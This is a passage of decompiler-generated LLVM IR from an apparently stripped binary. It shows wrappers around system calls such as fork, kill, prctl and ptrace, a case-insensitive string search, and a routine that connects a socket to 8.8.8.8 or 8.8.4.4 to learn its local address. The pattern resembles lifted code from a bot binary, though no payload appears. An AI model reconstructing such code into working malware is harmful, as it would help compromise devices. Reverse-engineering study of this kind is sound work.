  uselistorder label %dec_label_pc_404658, { 2, 1, 0 }
}

define i32 @function_404688() local_unnamed_addr {
dec_label_pc_404688:
  %v3_4046a0 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_4046a0, i32* @t9, align 4
  %v1_4046a8 = call i32 @function_4028bc()
  %v1_4046b0 = urem i32 %v1_4046a8, 2
  %v1_4046bc = icmp eq i32 %v1_4046b0, 0
  %. = select i1 %v1_4046bc, i32 134744072, i32 134743044
  ret i32 %.

; uselistorder directives
  uselistorder i32 ()* @function_4028bc, { 12, 11, 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
}

define i32 @function_4046e8() local_unnamed_addr {
dec_label_pc_4046e8:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_404708 = load i32, i32* @global_var_449444.201, align 4
  store i32 %v3_404708, i32* @t9, align 4
  store i32 16, i32* %stack_var_-40, align 4
  store i32 0, i32* @a2, align 4
  %v4_40471c = call i32 @function_405aa0(i32 2, i32 1)
  store i32 %v4_40471c, i32* @s0, align 4
  %v3_404734 = load i32, i32* @global_var_449324.222, align 4
  store i32 %v3_404734, i32* @t9, align 4
  %v2_404738 = icmp eq i32 %v4_40471c, -1
  br i1 %v2_404738, label %dec_label_pc_4047b8, label %dec_label_pc_40473c

dec_label_pc_40473c:                              ; preds = %dec_label_pc_4046e8
  store i32 2, i32* %stack_var_-36, align 4
  %v6_404744 = call i32 @function_404688()
  %v3_404754 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404754, i32* @t9, align 4
  %v6_40475c = call i32 @function_405490()
  %v3_40476c = load i32, i32* @global_var_4494a8.204, align 4
  store i32 %v3_40476c, i32* @t9, align 4
  %v0_404770 = load i32, i32* @s0, align 4
  %v2_404778 = inttoptr i32 %v6_40475c to i32*
  store i32 0, i32* %v2_404778, align 4
  %v6_404778 = bitcast i32* %stack_var_-36 to %sockaddr*
  %v7_404778 = call i32 @function_4056c0(i32 %v0_404770, %sockaddr* %v6_404778, i32 16)
  %v0_404784 = load i32, i32* @s0, align 4
  %v3_404788 = load i32, i32* @global_var_449280.296, align 4
  store i32 %v3_404788, i32* @t9, align 4
  %v3_404790 = ptrtoint i32* %stack_var_-40 to i32
  %v8_404790 = call i32 @function_405720(i32 %v0_404784, %sockaddr* %v6_404778, i32 %v3_404790)
  %v3_4047a0 = load i32, i32* @global_var_44928c.150, align 4
  store i32 %v3_4047a0, i32* @t9, align 4
  %v1_4047a8 = load i32, i32* @s0, align 4
  %v3_4047a8 = call i32 @function_4049d0(i32 %v1_4047a8)
  br label %dec_label_pc_4047b8

dec_label_pc_4047b8:                              ; preds = %dec_label_pc_4046e8, %dec_label_pc_40473c
  %v0_4047c4 = phi i32 [ 0, %dec_label_pc_4046e8 ], [ %v6_404744, %dec_label_pc_40473c ]
  ret i32 %v0_4047c4

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 ()* @function_404688, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_405aa0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_4047b8, { 1, 0 }
}

define i32 @function_4047d0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4047d0:
  %t2.global-to-local = alloca i32, align 4
  store i32 0, i32* %t2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_4047dc

dec_label_pc_4047dc:                              ; preds = %dec_label_pc_4047dc, %dec_label_pc_4047d0
  %v0_4047e0 = phi i32 [ %v3_4047e8, %dec_label_pc_4047dc ], [ %arg2, %dec_label_pc_4047d0 ]
  %v0_4047dc = phi i32 [ %v1_4047dc, %dec_label_pc_4047dc ], [ 0, %dec_label_pc_4047d0 ]
  %v1_4047dc = add i32 %v0_4047dc, 1
  %v1_4047e0 = inttoptr i32 %v0_4047e0 to i8*
  %v2_4047e0 = load i8, i8* %v1_4047e0, align 1
  %v1_4047e8 = icmp eq i8 %v2_4047e0, 0
  %v3_4047e8 = add i32 %v0_4047e0, 1
  br i1 %v1_4047e8, label %dec_label_pc_4047ec, label %dec_label_pc_4047dc

dec_label_pc_4047ec:                              ; preds = %dec_label_pc_4047dc
  %v0_404814.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_4047f8

dec_label_pc_4047f8:                              ; preds = %dec_label_pc_404854, %dec_label_pc_4047ec
  %v0_404814 = phi i32 [ %v1_404814, %dec_label_pc_404854 ], [ %v0_404814.pre, %dec_label_pc_4047ec ]
  %v0_4047fc = phi i32 [ %v0_4047fc5, %dec_label_pc_404854 ], [ %v3_4047e8, %dec_label_pc_4047ec ]
  %v0_404818 = phi i32 [ %v1_404818, %dec_label_pc_404854 ], [ %tmp, %dec_label_pc_4047ec ]
  %v1_4047f8 = inttoptr i32 %v0_404818 to i8*
  %v2_4047f8 = load i8, i8* %v1_4047f8, align 1
  %v3_4047f8 = sext i8 %v2_4047f8 to i32
  %v1_4047fc = inttoptr i32 %v0_4047fc to i8*
  %v2_4047fc = load i8, i8* %v1_4047fc, align 1
  %v3_4047fc = sext i8 %v2_4047fc to i32
  %v1_404800 = add nsw i32 %v3_4047f8, 191
  %v1_404804 = add nsw i32 %v3_4047fc, 191
  %v1_404808 = and i32 %v1_404800, 254
  %v1_40480c = and i32 %v1_404804, 254
  %v1_404810 = icmp ult i32 %v1_404808, 26
  %v1_404814 = add i32 %v0_404814, -1
  %v1_404818 = add i32 %v0_404818, 1
  %v1_40481c = icmp eq i1 %v1_404810, false
  %v3_40481c = icmp ult i32 %v1_40480c, 26
  br i1 %v1_40481c, label %dec_label_pc_404828, label %dec_label_pc_404820

dec_label_pc_404820:                              ; preds = %dec_label_pc_4047f8
  %v1_404824 = or i32 %v3_4047f8, 96
  br label %dec_label_pc_404828

dec_label_pc_404828:                              ; preds = %dec_label_pc_4047f8, %dec_label_pc_404820
  %v0_404834 = phi i32 [ %v3_4047f8, %dec_label_pc_4047f8 ], [ %v1_404824, %dec_label_pc_404820 ]
  %v1_404828 = icmp eq i1 %v3_40481c, false
  br i1 %v1_404828, label %dec_label_pc_404834, label %dec_label_pc_40482c

dec_label_pc_40482c:                              ; preds = %dec_label_pc_404828
  %v1_404830 = or i32 %v3_4047fc, 96
  br label %dec_label_pc_404834

dec_label_pc_404834:                              ; preds = %dec_label_pc_404828, %dec_label_pc_40482c
  %v1_404834 = phi i32 [ %v3_4047fc, %dec_label_pc_404828 ], [ %v1_404830, %dec_label_pc_40482c ]
  %v2_404834 = icmp eq i32 %v0_404834, %v1_404834
  br i1 %v2_404834, label %dec_label_pc_404838, label %dec_label_pc_40484c

dec_label_pc_404838:                              ; preds = %dec_label_pc_404834
  %v0_40483c = load i32, i32* %t2.global-to-local, align 4
  %v2_40483c = icmp eq i32 %v0_40483c, %v1_4047dc
  %v6_40483c = add i32 %v0_40483c, %arg2
  br i1 %v2_40483c, label %dec_label_pc_404840, label %dec_label_pc_404854

dec_label_pc_404840:                              ; preds = %dec_label_pc_404838
  %v4_404844 = sub i32 %v1_404818, %tmp
  ret i32 %v4_404844

dec_label_pc_40484c:                              ; preds = %dec_label_pc_404834
  store i32 0, i32* %t2.global-to-local, align 4
  br label %dec_label_pc_404854

dec_label_pc_404854:                              ; preds = %dec_label_pc_404838, %dec_label_pc_40484c
  %v2_404854 = phi i32 [ %v0_40483c, %dec_label_pc_404838 ], [ 0, %dec_label_pc_40484c ]
  %v0_4047fc5 = phi i32 [ %v6_40483c, %dec_label_pc_404838 ], [ %arg2, %dec_label_pc_40484c ]
  %v1_404854 = icmp sgt i32 %v1_404814, 0
  %v3_404854 = add i32 %v2_404854, 1
  store i32 %v3_404854, i32* %t2.global-to-local, align 4
  br i1 %v1_404854, label %dec_label_pc_4047f8, label %dec_label_pc_404858

dec_label_pc_404858:                              ; preds = %dec_label_pc_404854
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_40483c, { 1, 0, 2 }
  uselistorder i32 %v0_4047e0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %t2.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32 26, { 4, 5, 6, 7, 1, 8, 2, 3, 0, 9 }
  uselistorder i32 254, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9 }
  uselistorder i32 191, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_404854, { 1, 0 }
  uselistorder label %dec_label_pc_404834, { 1, 0 }
  uselistorder label %dec_label_pc_404828, { 1, 0 }
}

define i32 @function_404870() local_unnamed_addr {
dec_label_pc_404870:
  %s0.global-to-local = alloca i32, align 4
  %v0_40488c = load i32, i32* @a1, align 4
  %v1_40488c = add i32 %v0_40488c, -33
  %v1_404894 = icmp ult i32 %v1_40488c, 3
  %v3_404898 = load i32, i32* @global_var_449378.297, align 4
  store i32 %v3_404898, i32* @t9, align 4
  %v1_4048a4 = icmp eq i1 %v1_404894, false
  br i1 %v1_4048a4, label %dec_label_pc_4048c0, label %dec_label_pc_4048a8

dec_label_pc_4048a8:                              ; preds = %dec_label_pc_404870
  %v1_4048ac = call i32 @function_404900()
  %v1_4048c4.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_4048c0

dec_label_pc_4048c0:                              ; preds = %dec_label_pc_404870, %dec_label_pc_4048a8
  %v1_4048c4 = phi i32 [ %v0_40488c, %dec_label_pc_404870 ], [ %v1_4048c4.pre, %dec_label_pc_4048a8 ]
  %v0_4048c4 = load i32, i32* @a0, align 4
  %v2_4048c4 = call i32 (i32, i32, ...) @fcntl(i32 %v0_4048c4, i32 %v1_4048c4)
  %v3_4048c8 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_4048c8, i32* @t9, align 4
  %v0_4048cc = load i32, i32* @a3, align 4
  %v1_4048cc = icmp eq i32 %v0_4048cc, 0
  store i32 %v2_4048c4, i32* %s0.global-to-local, align 4
  br i1 %v1_4048cc, label %dec_label_pc_4048e8, label %dec_label_pc_4048d0

dec_label_pc_4048d0:                              ; preds = %dec_label_pc_4048c0
  %v1_4048d4 = call i32 @function_405490()
  %v0_4048e0 = load i32, i32* %s0.global-to-local, align 4
  %v2_4048e0 = inttoptr i32 %v1_4048d4 to i32*
  store i32 %v0_4048e0, i32* %v2_4048e0, align 4
  br label %dec_label_pc_4048e8

dec_label_pc_4048e8:                              ; preds = %dec_label_pc_4048c0, %dec_label_pc_4048d0
  %v4_4048f0 = phi i32 [ %v2_4048c4, %dec_label_pc_4048c0 ], [ -1, %dec_label_pc_4048d0 ]
  ret i32 %v4_4048f0

; uselistorder directives
  uselistorder label %dec_label_pc_4048e8, { 1, 0 }
  uselistorder label %dec_label_pc_4048c0, { 1, 0 }
}

define i32 @function_404900() local_unnamed_addr {
dec_label_pc_404900:
  %s0.global-to-local = alloca i32, align 4
  %v0_404924 = load i32, i32* @a3, align 4
  %v3_404934 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404934, i32* @t9, align 4
  %v1_404938 = icmp eq i32 %v0_404924, 0
  store i32 4220, i32* %s0.global-to-local, align 4
  br i1 %v1_404938, label %dec_label_pc_404954, label %dec_label_pc_40493c

dec_label_pc_40493c:                              ; preds = %dec_label_pc_404900
  %v1_404940 = call i32 @function_405490()
  %v0_40494c = load i32, i32* %s0.global-to-local, align 4
  %v2_40494c = inttoptr i32 %v1_404940 to i32*
  store i32 %v0_40494c, i32* %v2_40494c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404954

dec_label_pc_404954:                              ; preds = %dec_label_pc_404900, %dec_label_pc_40493c
  %v0_404954 = phi i32 [ 4220, %dec_label_pc_404900 ], [ -1, %dec_label_pc_40493c ]
  ret i32 %v0_404954

; uselistorder directives
  uselistorder label %dec_label_pc_404954, { 1, 0 }
}

define i32 @function_404970(i8* %arg1) local_unnamed_addr {
dec_label_pc_404970:
  %s0.global-to-local = alloca i32, align 4
  %v3_404990 = call i32 @chdir(i8* %arg1)
  %v3_404994 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404994, i32* @t9, align 4
  %v0_404998 = load i32, i32* @a3, align 4
  %v1_404998 = icmp eq i32 %v0_404998, 0
  store i32 %v3_404990, i32* %s0.global-to-local, align 4
  br i1 %v1_404998, label %dec_label_pc_4049b4, label %dec_label_pc_40499c

dec_label_pc_40499c:                              ; preds = %dec_label_pc_404970
  %v1_4049a0 = call i32 @function_405490()
  %v0_4049ac = load i32, i32* %s0.global-to-local, align 4
  %v2_4049ac = inttoptr i32 %v1_4049a0 to i32*
  store i32 %v0_4049ac, i32* %v2_4049ac, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4049b4

dec_label_pc_4049b4:                              ; preds = %dec_label_pc_404970, %dec_label_pc_40499c
  %v0_4049b4 = phi i32 [ %v3_404990, %dec_label_pc_404970 ], [ -1, %dec_label_pc_40499c ]
  ret i32 %v0_4049b4

; uselistorder directives
  uselistorder label %dec_label_pc_4049b4, { 1, 0 }
}

define i32 @function_4049d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4049d0:
  %s0.global-to-local = alloca i32, align 4
  %v1_4049f0 = call i32 @close(i32 %arg1)
  %v3_4049f4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_4049f4, i32* @t9, align 4
  %v0_4049f8 = load i32, i32* @a3, align 4
  %v1_4049f8 = icmp eq i32 %v0_4049f8, 0
  store i32 %v1_4049f0, i32* %s0.global-to-local, align 4
  br i1 %v1_4049f8, label %dec_label_pc_404a14, label %dec_label_pc_4049fc

dec_label_pc_4049fc:                              ; preds = %dec_label_pc_4049d0
  %v1_404a00 = call i32 @function_405490()
  %v0_404a0c = load i32, i32* %s0.global-to-local, align 4
  %v2_404a0c = inttoptr i32 %v1_404a00 to i32*
  store i32 %v0_404a0c, i32* %v2_404a0c, align 4
  br label %dec_label_pc_404a14

dec_label_pc_404a14:                              ; preds = %dec_label_pc_4049d0, %dec_label_pc_4049fc
  %v4_404a1c = phi i32 [ %v1_4049f0, %dec_label_pc_4049d0 ], [ -1, %dec_label_pc_4049fc ]
  ret i32 %v4_404a1c

; uselistorder directives
  uselistorder label %dec_label_pc_404a14, { 1, 0 }
}

define i32 @function_404a30() local_unnamed_addr {
dec_label_pc_404a30:
  %s0.global-to-local = alloca i32, align 4
  %v0_404a50 = call i32 @fork()
  %v3_404a54 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404a54, i32* @t9, align 4
  %v0_404a58 = load i32, i32* @a3, align 4
  %v1_404a58 = icmp eq i32 %v0_404a58, 0
  store i32 %v0_404a50, i32* %s0.global-to-local, align 4
  br i1 %v1_404a58, label %dec_label_pc_404a74, label %dec_label_pc_404a5c

dec_label_pc_404a5c:                              ; preds = %dec_label_pc_404a30
  %v1_404a60 = call i32 @function_405490()
  %v0_404a6c = load i32, i32* %s0.global-to-local, align 4
  %v2_404a6c = inttoptr i32 %v1_404a60 to i32*
  store i32 %v0_404a6c, i32* %v2_404a6c, align 4
  br label %dec_label_pc_404a74

dec_label_pc_404a74:                              ; preds = %dec_label_pc_404a30, %dec_label_pc_404a5c
  %v4_404a7c = phi i32 [ %v0_404a50, %dec_label_pc_404a30 ], [ -1, %dec_label_pc_404a5c ]
  ret i32 %v4_404a7c

; uselistorder directives
  uselistorder label %dec_label_pc_404a74, { 1, 0 }
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %s0.global-to-local = alloca i32, align 4
  %v0_404ab0 = call i32 @getpid()
  %v3_404ab4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404ab4, i32* @t9, align 4
  %v0_404ab8 = load i32, i32* @a3, align 4
  %v1_404ab8 = icmp eq i32 %v0_404ab8, 0
  store i32 %v0_404ab0, i32* %s0.global-to-local, align 4
  br i1 %v1_404ab8, label %dec_label_pc_404ad4, label %dec_label_pc_404abc

dec_label_pc_404abc:                              ; preds = %dec_label_pc_404a90
  %v1_404ac0 = call i32 @function_405490()
  %v0_404acc = load i32, i32* %s0.global-to-local, align 4
  %v2_404acc = inttoptr i32 %v1_404ac0 to i32*
  store i32 %v0_404acc, i32* %v2_404acc, align 4
  br label %dec_label_pc_404ad4

dec_label_pc_404ad4:                              ; preds = %dec_label_pc_404a90, %dec_label_pc_404abc
  %v4_404adc = phi i32 [ %v0_404ab0, %dec_label_pc_404a90 ], [ -1, %dec_label_pc_404abc ]
  ret i32 %v4_404adc

; uselistorder directives
  uselistorder label %dec_label_pc_404ad4, { 1, 0 }
}

define i32 @function_404af0() local_unnamed_addr {
dec_label_pc_404af0:
  %s0.global-to-local = alloca i32, align 4
  %v0_404b10 = call i32 @getppid()
  %v3_404b14 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404b14, i32* @t9, align 4
  %v0_404b18 = load i32, i32* @a3, align 4
  %v1_404b18 = icmp eq i32 %v0_404b18, 0
  store i32 %v0_404b10, i32* %s0.global-to-local, align 4
  br i1 %v1_404b18, label %dec_label_pc_404b34, label %dec_label_pc_404b1c

dec_label_pc_404b1c:                              ; preds = %dec_label_pc_404af0
  %v1_404b20 = call i32 @function_405490()
  %v0_404b2c = load i32, i32* %s0.global-to-local, align 4
  %v2_404b2c = inttoptr i32 %v1_404b20 to i32*
  store i32 %v0_404b2c, i32* %v2_404b2c, align 4
  br label %dec_label_pc_404b34

dec_label_pc_404b34:                              ; preds = %dec_label_pc_404af0, %dec_label_pc_404b1c
  %v4_404b3c = phi i32 [ %v0_404b10, %dec_label_pc_404af0 ], [ -1, %dec_label_pc_404b1c ]
  ret i32 %v4_404b3c

; uselistorder directives
  uselistorder label %dec_label_pc_404b34, { 1, 0 }
}

define i32 @function_404b50(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404b50:
  %s0.global-to-local = alloca i32, align 4
  %v2_404b70 = call i32 @kill(i32 %arg1, i32 %arg2)
  %v3_404b74 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404b74, i32* @t9, align 4
  %v0_404b78 = load i32, i32* @a3, align 4
  %v1_404b78 = icmp eq i32 %v0_404b78, 0
  store i32 %v2_404b70, i32* %s0.global-to-local, align 4
  br i1 %v1_404b78, label %dec_label_pc_404b94, label %dec_label_pc_404b7c

dec_label_pc_404b7c:                              ; preds = %dec_label_pc_404b50
  %v1_404b80 = call i32 @function_405490()
  %v0_404b8c = load i32, i32* %s0.global-to-local, align 4
  %v2_404b8c = inttoptr i32 %v1_404b80 to i32*
  store i32 %v0_404b8c, i32* %v2_404b8c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404b94

dec_label_pc_404b94:                              ; preds = %dec_label_pc_404b50, %dec_label_pc_404b7c
  %v0_404b94 = phi i32 [ %v2_404b70, %dec_label_pc_404b50 ], [ -1, %dec_label_pc_404b7c ]
  ret i32 %v0_404b94

; uselistorder directives
  uselistorder label %dec_label_pc_404b94, { 1, 0 }
}

define i32 @function_404bb0(i8* %arg1) local_unnamed_addr {
dec_label_pc_404bb0:
  %s0.global-to-local = alloca i32, align 4
  %v0_404bcc = load i32, i32* @a1, align 4
  %v1_404bcc = and i32 %v0_404bcc, 256
  %v1_404bd8 = icmp eq i32 %v1_404bcc, 0
  br i1 %v1_404bd8, label %dec_label_pc_404bec, label %dec_label_pc_404bdc

dec_label_pc_404bdc:                              ; preds = %dec_label_pc_404bb0
  br label %dec_label_pc_404bec

dec_label_pc_404bec:                              ; preds = %dec_label_pc_404bb0, %dec_label_pc_404bdc
  %v4_404bf4 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v0_404bcc)
  %v3_404bf8 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404bf8, i32* @t9, align 4
  %v0_404bfc = load i32, i32* @a3, align 4
  %v1_404bfc = icmp eq i32 %v0_404bfc, 0
  store i32 %v4_404bf4, i32* %s0.global-to-local, align 4
  br i1 %v1_404bfc, label %dec_label_pc_404c18, label %dec_label_pc_404c00

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404bec
  %v1_404c04 = call i32 @function_405490()
  %v0_404c10 = load i32, i32* %s0.global-to-local, align 4
  %v2_404c10 = inttoptr i32 %v1_404c04 to i32*
  store i32 %v0_404c10, i32* %v2_404c10, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404c18

dec_label_pc_404c18:                              ; preds = %dec_label_pc_404bec, %dec_label_pc_404c00
  %v0_404c18 = phi i32 [ %v4_404bf4, %dec_label_pc_404bec ], [ -1, %dec_label_pc_404c00 ]
  ret i32 %v0_404c18

; uselistorder directives
  uselistorder label %dec_label_pc_404c18, { 1, 0 }
  uselistorder label %dec_label_pc_404bec, { 1, 0 }
}

define i32 @function_404c2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404c2c:
  %v3_404c38 = load i32, i32* @global_var_4491f4.298, align 4
  store i32 %v3_404c38, i32* @t9, align 4
  store i32 %arg1, i32* @a2, align 4
  store i32 769, i32* @a1, align 4
  %v3_404c40 = call i32 @function_404bb0(i8* inttoptr (i32 769 to i8*))
  ret i32 %v3_404c40
}

define i32 @function_404c50(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404c50:
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 4192, i32* %v0.global-to-local, align 4
  %v2_404c88 = load i32, i32* @a2, align 4
  %v3_404c88 = load i32, i32* @a3, align 4
  %v4_404c88 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %v2_404c88, i32 %v3_404c88, i32 0)
  store i32 %v4_404c88, i32* %v0.global-to-local, align 4
  %v3_404c90 = load i32, i32* @global_var_4492e0.256, align 4
  %v0_404c94 = load i32, i32* @a3, align 4
  %v1_404c94 = icmp eq i32 %v0_404c94, 0
  store i32 %v4_404c88, i32* %s0.global-to-local, align 4
  br i1 %v1_404c94, label %dec_label_pc_404cb0, label %dec_label_pc_404c98

dec_label_pc_404c98:                              ; preds = %dec_label_pc_404c50
  call void @__pseudo_call(i32 %v3_404c90)
  %v0_404ca8 = load i32, i32* %s0.global-to-local, align 4
  %v1_404ca8 = load i32, i32* %v0.global-to-local, align 4
  %v2_404ca8 = inttoptr i32 %v1_404ca8 to i32*
  store i32 %v0_404ca8, i32* %v2_404ca8, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404cb0

dec_label_pc_404cb0:                              ; preds = %dec_label_pc_404c50, %dec_label_pc_404c98
  %v4_404cc0 = phi i32 [ %v4_404c88, %dec_label_pc_404c50 ], [ -1, %dec_label_pc_404c98 ]
  ret i32 %v4_404cc0

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_404cb0, { 1, 0 }
}

define i32 @function_404cd0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404cd0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_404cf0 = add i32 %arg1, -1
  %v1_404cf8 = icmp ult i32 %v1_404cf0, 3
  store i32 %arg1, i32* %s1.global-to-local, align 4
  %v1_404d10 = icmp eq i1 %v1_404cf8, false
  %v2_404d18 = ptrtoint i32* %stack_var_-24 to i32
  %v0_404d04.v2_404d18 = select i1 %v1_404d10, i32 %arg4, i32 %v2_404d18
  store i32 %v0_404d04.v2_404d18, i32* @a3, align 4
  store i32 4026, i32* %v0.global-to-local, align 4
  %v1_404d24 = call i32 (i32, ...) @ptrace(i32 %arg1)
  store i32 %v1_404d24, i32* %v0.global-to-local, align 4
  %v3_404d28 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404d28, i32* @t9, align 4
  %v0_404d2c = load i32, i32* @a3, align 4
  %v1_404d2c = icmp eq i32 %v0_404d2c, 0
  store i32 %v1_404d24, i32* %s0.global-to-local, align 4
  br i1 %v1_404d2c, label %dec_label_pc_404d4c, label %dec_label_pc_404d30

dec_label_pc_404d30:                              ; preds = %dec_label_pc_404cd0
  %v1_404d34 = call i32 @function_405490()
  store i32 %v1_404d34, i32* %v0.global-to-local, align 4
  %v0_404d40 = load i32, i32* %s0.global-to-local, align 4
  %v2_404d40 = inttoptr i32 %v1_404d34 to i32*
  store i32 %v0_404d40, i32* %v2_404d40, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  %v0_404d4c.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404d4c

dec_label_pc_404d4c:                              ; preds = %dec_label_pc_404cd0, %dec_label_pc_404d30
  %v0_404d4c = phi i32 [ %v1_404d24, %dec_label_pc_404cd0 ], [ %v0_404d4c.pre, %dec_label_pc_404d30 ]
  %v2_404d60 = phi i32 [ %v1_404d24, %dec_label_pc_404cd0 ], [ -1, %dec_label_pc_404d30 ]
  %v1_404d4c = icmp slt i32 %v0_404d4c, 0
  store i32 %v2_404d60, i32* %v0.global-to-local, align 4
  br i1 %v1_404d4c, label %dec_label_pc_404d84, label %dec_label_pc_404d50

dec_label_pc_404d50:                              ; preds = %dec_label_pc_404d4c
  %v0_404d54 = load i32, i32* %s1.global-to-local, align 4
  %v1_404d54 = icmp eq i32 %v0_404d54, 0
  %v3_404d54 = icmp ult i32 %v0_404d54, 4
  %v4_404d54 = zext i1 %v3_404d54 to i32
  store i32 %v4_404d54, i32* %v0.global-to-local, align 4
  br i1 %v1_404d54, label %dec_label_pc_404d80, label %dec_label_pc_404d58

dec_label_pc_404d58:                              ; preds = %dec_label_pc_404d50
  %v3_404d5c = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404d5c, i32* @t9, align 4
  %v1_404d60 = icmp eq i1 %v3_404d54, false
  store i32 %v2_404d60, i32* %v0.global-to-local, align 4
  br i1 %v1_404d60, label %dec_label_pc_404d84, label %dec_label_pc_404d64

dec_label_pc_404d64:                              ; preds = %dec_label_pc_404d58
  %v1_404d68 = call i32 @function_405490()
  store i32 %v1_404d68, i32* %v0.global-to-local, align 4
  %v1_404d74 = inttoptr i32 %v1_404d68 to i32*
  store i32 0, i32* %v1_404d74, align 4
  %v3_404d78 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_404d78, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404d80

dec_label_pc_404d80:                              ; preds = %dec_label_pc_404d50, %dec_label_pc_404d64
  %v0_404d80 = phi i32 [ %v2_404d60, %dec_label_pc_404d50 ], [ %v3_404d78, %dec_label_pc_404d64 ]
  store i32 %v0_404d80, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404d84

dec_label_pc_404d84:                              ; preds = %dec_label_pc_404d58, %dec_label_pc_404d4c, %dec_label_pc_404d80
  %v4_404d90 = phi i32 [ %v2_404d60, %dec_label_pc_404d58 ], [ %v2_404d60, %dec_label_pc_404d4c ], [ %v0_404d80, %dec_label_pc_404d80 ]
  ret i32 %v4_404d90

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 1, 5, 3, 2, 4, 7, 8, 0, 6 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_404d84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_404d80, { 1, 0 }
  uselistorder label %dec_label_pc_404d4c, { 1, 0 }
}

define i32 @function_404da0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404da0:
  %s0.global-to-local = alloca i32, align 4
  %v4_404dc0 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  %v3_404dc4 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404dc4, i32* @t9, align 4
  %v0_404dc8 = load i32, i32* @a3, align 4
  %v1_404dc8 = icmp eq i32 %v0_404dc8, 0
  store i32 %v4_404dc0, i32* %s0.global-to-local, align 4
  br i1 %v1_404dc8, label %dec_label_pc_404de4, label %dec_label_pc_404dcc

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404da0
  %v1_404dd0 = call i32 @function_405490()
  %v0_404ddc = load i32, i32* %s0.global-to-local, align 4
  %v2_404ddc = inttoptr i32 %v1_404dd0 to i32*
  store i32 %v0_404ddc, i32* %v2_404ddc, align 4
  br label %dec_label_pc_404de4

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404da0, %dec_label_pc_404dcc
  %v4_404dec = phi i32 [ %v4_404dc0, %dec_label_pc_404da0 ], [ -1, %dec_label_pc_404dcc ]
  ret i32 %v4_404dec

; uselistorder directives
  uselistorder label %dec_label_pc_404de4, { 1, 0 }
}

define i32 @function_404e00(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404e00:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %v7_404e20 = call i32 @readlink(i8* %arg1, i8* %tmp, i32 %arg3)
  %v3_404e24 = load i32, i32* @global_var_4492e0.256, align 4
  store i32 %v3_404e24, i32* @t9, align 4
  %v1_404e28 = icmp eq i32 %arg4, 0
  store i32 %v7_404e20, i32* %s0.global-to-local, align 4
  br i1 %v1_404e28, label %dec_label_pc_404e44, label %dec_label_pc_404e2c

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404e00
  %v1_404e30 = call i32 @function_405490()
  %v0_404e3c = load i32, i32* %s0.global-to-local, align 4
  %v2_404e3c = inttoptr i32 %v1_404e30 to i32*
  store i32 %v0_404e3c, i32* %v2_404e3c, align 4
  br label %dec_label_pc_404e44

dec_label_pc_404e44:                              ; preds = %dec_label_pc_404e00, %dec_label_pc_404e2c
